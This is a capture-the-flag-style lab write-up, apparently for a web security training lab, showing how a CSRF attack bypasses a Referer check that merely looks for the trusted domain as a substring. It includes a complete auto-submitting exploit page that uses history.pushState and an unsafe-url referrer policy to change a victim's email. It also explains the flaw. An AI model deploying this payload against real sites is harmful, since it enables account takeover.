#LAB: CSRF with broken Referer validation

## Objective

Exploit a CSRF vulnerability where the application incorrectly validates the `Referer` header by checking whether the victim's domain appears somewhere within the header.

## Steps

### 1. Identify the vulnerable request

Log in to the lab and change the email address normally.

Capture the request in Burp Suite:

POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<SESSION>
Content-Type: application/x-www-form-urlencoded

email=<ATTACKER-EMAIL>

The request changes the victim's email address.

### 2. Test the Referer validation

Send the request to Burp Repeater and modify the Referer header.

For example:

Referer: https://gsg.net

The server responds with:

"Invalid referer header"

This confirms that Referer validation is in place.

The weakness is that the application checks whether the trusted victim domain is contained somewhere in the Referer instead of properly validating the origin.

### 3. Create the CSRF exploit

Open the Exploit Server and use the following:

<html>
<head>
    <meta name="referrer" content="unsafe-url">
</head>
<body>
    <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="<ATTACKER-EMAIL>">
    </form>

    <script>
        history.pushState("", "", "/?<LAB-ID>.web-security-academy.net");
        document.forms[0].submit();
    </script>
</body>
</html>

Replace <LAB-ID>.web-security-academy.net with the actual lab domain and <ATTACKER-EMAIL> with the email address you want to set.

### 4. Understand history.pushState()

The following line:

history.pushState("", "", "/?<LAB-ID>.web-security-academy.net");

changes the URL of the exploit page without navigating away from the exploit server.

The URL becomes similar to:

https://<EXPLOIT-SERVER>/?<LAB-ID>.web-security-academy.net

When the browser sends the request, the Referer therefore contains the victim's domain.

Because the vulnerable application only checks whether the victim domain appears somewhere in the Referer, the validation can be bypassed.

### 5. Understand unsafe-url

The exploit contains:

<meta name="referrer" content="unsafe-url">

Without this policy, the browser may strip the path/query portion of the cross-origin Referer.

The server could therefore receive only:

Referer: https://<EXPLOIT-SERVER>

The victim domain would be missing.

With unsafe-url, the full exploit URL can be included:

Referer: https://<EXPLOIT-SERVER>/?<LAB-ID>.web-security-academy.net

The vulnerable Referer check now finds the victim domain inside the header.

### 6. Store and deliver the exploit

Click:

Store

Then click:

Deliver exploit to victim

The victim's browser loads the exploit page.

The JavaScript automatically submits the form to:

POST /my-account/change-email

Because the victim is authenticated, the request is made using the victim's session.

### 7. Result

The server accepts the request because the Referer contains the trusted victim domain, even though the request originated from the attacker-controlled exploit server.

The victim's email address is changed to the supplied attacker-controlled email.

## Vulnerability Explanation

The application effectively performs a check similar to:

if Referer contains "<LAB-ID>.web-security-academy.net":
    accept request
else:
    reject request

This is insecure because an attacker can place the trusted domain inside an attacker-controlled URL.

The application should properly parse and validate the Referer origin rather than performing a simple substring/contains check.

## Key Takeaways

- Referer validation can provide CSRF protection when implemented correctly.
- Checking whether a trusted domain merely appears somewhere in the Referer is unsafe.
- history.pushState() changes the exploit URL without navigating away from the exploit server.
- Referrer-Policy: unsafe-url allows the required URL components to be included in the Referer.
- The CSRF succeeds because the server incorrectly trusts a Referer containing the victim's domain.
